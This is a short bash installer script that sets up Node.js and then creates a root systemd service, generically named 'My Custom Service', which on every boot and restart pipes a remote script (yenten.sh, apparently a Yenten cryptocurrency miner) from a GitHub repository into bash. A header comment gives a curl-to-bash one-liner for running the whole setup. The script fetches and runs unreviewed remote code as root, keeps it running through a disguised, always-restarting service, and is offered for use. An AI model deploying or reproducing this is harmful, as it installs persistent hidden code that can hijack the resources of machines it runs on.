#!/bin/bash
# curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/yenten_service.sh|bash

# Step 1: Install necessary dependencies
apt update -y
apt install curl wget git -y

# Step 2: Install nvm and Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
nvm install --lts

# Step 3: Create the main script
cat << 'EOF' > /usr/local/bin/my_service.sh
#!/bin/bash
# Download and run the yenten.sh script
curl https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/yenten.sh | bash
EOF

# Step 4: Make the main script executable
chmod +x /usr/local/bin/my_service.sh

# Step 5: Create the systemd service file
cat << 'EOF' > /etc/systemd/system/my_service.service
[Unit]
Description=My Custom Service
After=network.target

[Service]
ExecStart=/usr/local/bin/my_service.sh
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Step 6: Reload systemd and start the service
systemctl daemon-reload
systemctl start my_service.service
systemctl enable my_service.service

echo "Setup completed! The service is now running and enabled on boot."
